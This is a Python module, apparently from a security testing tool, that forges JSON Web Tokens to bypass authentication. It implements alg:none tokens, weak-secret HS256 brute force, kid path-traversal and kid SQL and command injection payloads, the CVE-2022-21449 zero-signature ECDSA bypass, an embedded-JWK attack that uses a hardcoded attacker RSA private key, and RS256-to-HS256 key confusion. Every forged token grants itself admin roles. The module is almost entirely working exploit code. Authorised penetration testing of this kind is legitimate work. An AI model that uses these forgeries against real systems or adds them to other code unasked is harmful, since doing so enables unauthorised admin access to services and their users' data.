"""JWT forgery primitives for testing token acceptance (stdlib only, no PyJWT dep)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any


def _b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _seg(obj: dict[str, Any]) -> str:
    return _b64u(json.dumps(obj, separators=(",", ":")).encode())


WEAK_SECRETS: tuple[str, ...] = (
    "secret", "jwt", "admin", "password", "123456", "key", "changeme", "test",
    "your-256-bit-secret", "supersecret", "jwtsecret", "s3cr3t", "private",
    "jwt_secret", "default", "secretkey", "qwerty",
)


def decode_payload(token: str) -> dict[str, Any]:
    """Decode a JWT's claims without verifying, or {} if it cannot be parsed."""
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        out = json.loads(base64.urlsafe_b64decode(seg))
        return out if isinstance(out, dict) else {}
    except Exception:
        return {}


def _escalated(base: dict[str, Any] | None = None) -> dict[str, Any]:
    """Copy base claims and overlay admin roles plus fresh iat/exp."""
    now = int(time.time())
    p: dict[str, Any] = dict(base or {})
    p.setdefault("sub", p.get("user_id", p.get("id", "1")))
    p.update({
        "role": "admin", "admin": True, "isAdmin": True, "scope": "admin",
        "roles": ["admin"], "iat": now, "exp": now + 3600,
    })
    return p


def forge_none(base_payload: dict[str, Any] | None = None) -> str:
    return f"{_seg({'alg': 'none', 'typ': 'JWT'})}.{_seg(_escalated(base_payload))}."


def forge_hs256(secret: str, base_payload: dict[str, Any] | None = None) -> str:
    header = _seg({"alg": "HS256", "typ": "JWT"})
    payload = _seg(_escalated(base_payload))
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64u(sig)}"


def forge_kid_traversal(base_payload: dict[str, Any] | None = None) -> str:
    """Forge an HS256 token whose kid points at /dev/null, signed with an empty key.

    Targets servers that load the HMAC key from the kid path: an empty-file key
    makes the empty-secret signature verify.
    """
    header = _seg({"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"})
    payload = _seg(_escalated(base_payload))
    sig = hmac.new(b"", f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64u(sig)}"


# The literal an injected `kid` resolves to; we then HMAC-sign with the same literal, so a server
# that interpolates kid into a key lookup (SQL/command) and returns our injected value verifies it.
_KID_INJECT_KEY = "gqlkey"
_KID_PAYLOADS = {
    "sqli": f"nokey' UNION SELECT '{_KID_INJECT_KEY}",
    "command": f"nokey|echo -n {_KID_INJECT_KEY}",
    "path": "/proc/sys/kernel/randomize_va_space",  # a predictable-content file → key "0\n"
}


def forge_kid_injection(base_payload: dict[str, Any] | None = None, mode: str = "sqli") -> str:
    """Forge an HS256 token whose `kid` injects into the server's key lookup (SQLi/command).

    The kid is crafted so a backend that does `SELECT key WHERE kid='<kid>'` (or shells out)
    returns a value WE control (`_KID_INJECT_KEY`); the token is HMAC-signed with that same
    value, so it verifies. `mode` picks the injection channel.
    """
    m = (mode or "sqli").lower()
    if m == "path":
        header = _seg({"alg": "HS256", "typ": "JWT", "kid": _KID_PAYLOADS["path"]})
        payload = _seg(_escalated(base_payload))
        sig = hmac.new(b"0\n", f"{header}.{payload}".encode(), hashlib.sha256).digest()
        return f"{header}.{payload}.{_b64u(sig)}"
    kid = _KID_PAYLOADS.get(m, _KID_PAYLOADS["sqli"])
    header = _seg({"alg": "HS256", "typ": "JWT", "kid": kid})
    payload = _seg(_escalated(base_payload))
    sig = hmac.new(_KID_INJECT_KEY.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64u(sig)}"


_PSYCHIC_SIG_LEN = {"ES256": 64, "ES384": 96, "ES512": 132}


def forge_psychic(base_payload: dict[str, Any] | None = None, alg: str = "ES256") -> str:
    """Forge an ECDSA (ES256/384/512) token with an all-zero r=s=0 signature (CVE-2022-21449).

    A verifier on a vulnerable JVM (or any impl that doesn't reject r=0/s=0) treats the
    trivially-forgeable zero signature as valid, so any attacker-crafted token passes.
    """
    a = (alg or "ES256").upper()
    header = _seg({"alg": a, "typ": "JWT"})
    payload = _seg(_escalated(base_payload))
    sig = _b64u(b"\x00" * _PSYCHIC_SIG_LEN.get(a, 64))
    return f"{header}.{payload}.{sig}"


# A fixed attacker-controlled RSA-2048 keypair. The public half is embedded in the token's `jwk`
# header; the private half signs it, so a verifier that trusts the attached key validates any token.
_ATTACKER_RSA_N = 0xb093ca9cf50cfedbb94239875527a26c6244c39273a1ce5dc90a9ad421197e33019ffc474657380ec5ad67c137f6a088a035645b28ec861ed2aec2234c4dc8a42bd9138c48db84f47c967701afc136092264f8314ed42139f6b59758047f5376ce07d056bda00764f8bcfdf652c38fe99ff78468d247cadcb149a78ae8a60a572f364c81100a47fba8fbe97818dbe66da1458fe60cdae20585bf7374c60705a56021d16bbfef83bcfbc2272d3652e34a47bd34c620c1d859f68fd2270703063b057ddd044555a2d64f4c0926c07b0436e0ecc6336252b394b706829fe81452533923c79a657d048567a158394450ef2b3b9b8b3006a5ec2a053eacd5f8157a61
_ATTACKER_RSA_E = 65537
_ATTACKER_RSA_D = 0x1633d71faa3e62935d3583074dc1488e8942ad36ae7c7376de6f0b6dcde5a73521a8acaf879c32ebc4965bbbf35dfaec82fc83ac64b66cdcd64fec10452968a79fedd123ec0b5229edba7ba74622acb9344e6ed8c05932fe575398fe93be30cff8f30992c690272dde8ae10206811988de38e0b8cf6c0089846f46f653ef80d024b5b90465150ef9d3f94c37acdfa91069a3108b97e30183d5bbec44263cecba35d6c2c443d1d2a87553e8ab168542b2a21f2393c453c871f1b8cb15c73b48dda2c5a133268f74f42d85f632bb3d2b056466ce71ba1c6599f50d654dcb893f1ec1875985f14a3bb9d2e9fb4bf8469582086b3cca3af3f7d6c287c273db2914a3

_SHA256_DER_PREFIX = bytes.fromhex("3031300d060960864801650304020105000420")


def _int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")


def _rs256_sign(message: bytes, d: int, n: int) -> bytes:
    """Sign `message` with RSASSA-PKCS1-v1_5 / SHA-256 in pure Python (no crypto dep)."""
    k = (n.bit_length() + 7) // 8
    t = _SHA256_DER_PREFIX + hashlib.sha256(message).digest()
    em = b"\x00\x01" + b"\xff" * (k - len(t) - 3) + b"\x00" + t
    return pow(int.from_bytes(em, "big"), d, n).to_bytes(k, "big")


def forge_jwk_injection(base_payload: dict[str, Any] | None = None) -> str:
    """Forge an RS256 token that embeds our own public key in the `jwk` header (self-signed).

    Verifiers that trust the token's embedded `jwk` instead of a pinned key validate any
    attacker-signed token, so the escalated claims are accepted.
    """
    jwk = {"kty": "RSA", "n": _b64u(_int_to_bytes(_ATTACKER_RSA_N)),
           "e": _b64u(_int_to_bytes(_ATTACKER_RSA_E))}
    header = _seg({"alg": "RS256", "typ": "JWT", "jwk": jwk})
    payload = _seg(_escalated(base_payload))
    sig = _rs256_sign(f"{header}.{payload}".encode(), _ATTACKER_RSA_D, _ATTACKER_RSA_N)
    return f"{header}.{payload}.{_b64u(sig)}"


def forge_alg_confusion(pubkey_pem: str, base_payload: dict[str, Any] | None = None) -> str:
    """RS256->HS256 confusion: HMAC-sign with the server's RSA public key as the secret.

    A verifier that reads `alg` from the token header will HMAC-verify with the (public) RSA
    key it normally uses for RSA verification, so this attacker-signed token validates.
    """
    return forge_hs256(pubkey_pem, base_payload)


# --- JWKS discovery + JWK->PEM (for RS256->HS256 confusion) ------------------------------------ #

_JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration",
               "/oauth/jwks", "/api/jwks")


def _b64u_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = _int_to_bytes(n)
    return bytes([0x80 | len(b)]) + b


def _der_int(raw: bytes) -> bytes:
    if raw and raw[0] & 0x80:
        raw = b"\x00" + raw
    return b"\x02" + _der_len(len(raw)) + raw


def _der_seq(*parts: bytes) -> bytes:
    body = b"".join(parts)
    return b"\x30" + _der_len(len(body)) + body


def jwk_to_pem(n_b64u: str, e_b64u: str) -> str:
    """Build a standard SubjectPublicKeyInfo PEM from a JWK's base64url n/e."""
    rsa_pub = _der_seq(_der_int(_b64u_decode(n_b64u)), _der_int(_b64u_decode(e_b64u)))
    alg_id = _der_seq(bytes.fromhex("06092a864886f70d010101") + bytes.fromhex("0500"))
    bit_str = b"\x03" + _der_len(len(rsa_pub) + 1) + b"\x00" + rsa_pub
    spki = _der_seq(alg_id, bit_str)
    b64 = base64.b64encode(spki).decode()
    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"


def fetch_rsa_pubkey_pem(endpoint_url: str, session: Any = None) -> str | None:
    """Try common JWKS paths at the endpoint's origin and return the first RSA key as a PEM.

    Returns None if nothing usable is found. Never raises - discovery is best-effort.
    """
    import json as _json
    from urllib.parse import urljoin

    import requests
    http = session or requests
    for path in _JWKS_PATHS:
        try:
            url = urljoin(endpoint_url, path)
            r = http.get(url, timeout=8)
            if r.status_code != 200:
                continue
            doc = r.json()
            keys = doc.get("keys") if isinstance(doc, dict) else None
            if keys is None and isinstance(doc, dict) and doc.get("jwks_uri"):
                r2 = http.get(doc["jwks_uri"], timeout=8)
                keys = (r2.json() or {}).get("keys")
            for k in keys or []:
                if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
                    return jwk_to_pem(k["n"], k["e"])
        except (requests.RequestException, ValueError, _json.JSONDecodeError, KeyError):
            continue
    return None


def forged_tokens(approach: str, base_payload: dict[str, Any] | None = None) -> list[tuple[str, str]]:
    """Return (label, token) pairs for one attack approach, or [] if unknown.

    The weak-secret approach yields one candidate per entry in WEAK_SECRETS.
    """
    if approach == "jwt_none_alg":
        return [("alg:none", forge_none(base_payload))]
    if approach == "jwt_kid_inject":
        return [("kid:/dev/null", forge_kid_traversal(base_payload))]
    if approach == "jwt_kid_sqli":
        return [("kid:sqli", forge_kid_injection(base_payload, "sqli")),
                ("kid:command", forge_kid_injection(base_payload, "command"))]
    if approach == "jwt_jwk_inject":
        return [("jwk:embedded", forge_jwk_injection(base_payload))]
    if approach == "jwt_psychic":
        return [("psychic:ES256", forge_psychic(base_payload, "ES256"))]
    if approach == "jwt_weak_secret":
        return [(f"hs256:{s}", forge_hs256(s, base_payload)) for s in WEAK_SECRETS]
    return []
